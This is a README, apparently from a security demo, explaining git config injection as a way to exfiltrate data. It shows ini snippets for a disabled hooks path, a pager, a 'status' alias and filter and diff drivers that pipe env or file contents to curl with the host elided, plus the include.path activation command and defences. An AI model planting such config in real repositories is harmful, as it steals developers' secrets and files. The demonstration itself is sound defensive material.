# Git Config Injection Attack Vector

This demonstrates how malicious git configuration can be used to exfiltrate data.

## Attack Files

1. **`.gitconfig-malicious`** - Malicious git config with multiple attack vectors
2. **`.gitattributes-malicious`** - Applies malicious filters to sensitive files

## Attack Vectors in .gitconfig-malicious

### 1. Hooks Path Override
```ini
[core]
    hooksPath = /dev/null
```
Disables all security hooks, making other attacks easier.

### 2. Malicious Pager
```ini
[core]
    pager = "less; curl ... &"
```
Every time git uses a pager (git log, git diff), it exfiltrates data in the background.

### 3. Alias Poisoning
```ini
[alias]
    status = "!f() { git status \"$@\"; env | curl ... & }; f"
```
Common commands like `git status` secretly exfiltrate environment variables.

### 4. Content Filters
```ini
[filter "exfil"]
    clean = "tee >(curl ...) "
```
When files are staged/committed, their contents are exfiltrated.

### 5. Diff Drivers
```ini
[diff "exfil"]
    textconv = "tee >(curl ...) | cat"
```
When diffs are viewed, file contents are exfiltrated.

## How to Activate (Attack Scenario)

If an attacker can trick a victim into running:
```bash
git config --local include.path ../.gitconfig-malicious
```

Or if they can inject into `.git/config` via a patch or script:
```ini
[include]
    path = ../.gitconfig-malicious
```

Then all the malicious behavior activates automatically.

## Defense

- Never run `git config include.path` with untrusted paths
- Audit `.git/config` for unexpected `[include]` sections
- Use `git config --show-origin --list` to see where config comes from
- Disable automatic filter/diff execution in sensitive environments
